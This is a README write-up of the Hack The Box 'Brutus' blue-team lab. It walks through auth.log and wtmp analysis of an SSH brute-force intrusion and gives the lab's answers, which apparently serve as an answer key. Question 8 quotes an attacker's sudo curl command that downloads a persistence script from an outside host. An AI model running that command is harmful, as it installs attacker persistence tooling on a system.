# Simulating-a-Brute-Force-attack

This is a project made via **hackthebox.com** called “Brutus”, more specifically a project simulating a blue team scenario.

**Briefly introduction to the scenario:**

After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for bruteforce analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

## Skills Acquired

- **Unix log analysis**
- **WTMP analysis**
- **Brute-force activity detection**
- **Timeline creation**
- **Contextual analysis**
- **Post-exploitation analysis**

---

## Initial Analysis

We were provided with **Linux** authentication logs (`auth.log`) and the `WTMP` file.

- **`auth.log`**: Tracks authentication attempts, user switches, and `sudo` commands.
- **`WTMP`**: Logs system login and logout events. It is a binary file located at `/var/log/wtmp`, which can be viewed using the `last` command.

Both files are essential for access auditing and incident detection.

---

## Project Questions

### 1. What is the IP address used by the attacker for the brute-force attack?

To detect a brute-force attack in `auth.log`, we look for multiple occurrences of "Invalid user" and "Failed password" within a short period:

```sh
grep sshd auth.log
```
![Question 1-1](images/question%201-1.png)
![Question 1-2](images/question%201-2.png)

The attacker's IP address was identified as:

```
65.2.161.68
```

### 2. What is the compromised username?

The `auth.log` file shows that the attacker successfully authenticated as `root`:

![Question 2](images/question%202.png)

```
Accepted password for root from 65.2.161.68
```

Thus, the compromised user was:

```
root
```

### 3. What is the timestamp when the attacker manually logged into the server?

The first successful password authentication occurred at **06:32:44**, and the session was closed 5 minutes later:

![Question 3-1](images/question%203-1.png)

```
06:32:44
```

This was confirmed using the command:

```sh
utmpdump wtmp
```
![Question 3-2](images/question%203-2.png)

### 4. What is the attacker's session number?

Using the command:

```sh
grep session auth.log
```
![Question 4-1](images/question%204-1.png)

There is a line that could give us a clue of what we are looking for and that is the line with “system-logind”, so we can use this to make a proper search in the file:

![Question 4-2](images/question%204-2.png)

The attacker's session was identified as:

```
37
```

### 5. What user did the attacker create for persistence, and what privileges were granted?

Running:

```sh
grep useradd auth.log
grep usermod auth.log
```

![Question 5-1](images/question%205-1.png)
![Question 5-2](images/question%205-2.png)

It was detected that the attacker created the user:

```
cyberjunkie
```

Additionally, this user was granted **elevated privileges**.

### 6. What is the MITRE ATT&CK sub-technique ID used for persistence by creating an account?

![Question 6-1](images/question%206-1.png)
![Question 6-2](images/question%206-2.png)

According to the **MITRE ATT&CK** database, the sub-technique ID for persistence via local account creation is:

```
T1136.001
```

### 7. When did the attacker's first SSH session end?

Using:

```sh
grep systemd-logind auth.log
```
![Question 7](images/question%207.png)

It was identified that session **37** ended at:

```
06:37:24
```

### 8. What command did the attacker execute with elevated privileges to download a script?

Using:

```sh
grep sudo auth.log
```
![Question 8](images/question%208.png)

The following command was found:

```sh
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

---

## Conclusion

This analysis allowed us to identify the attacker's actions using authentication logs and auditing tools. Key data points such as the source IP, privilege escalation, and system persistence were extracted.
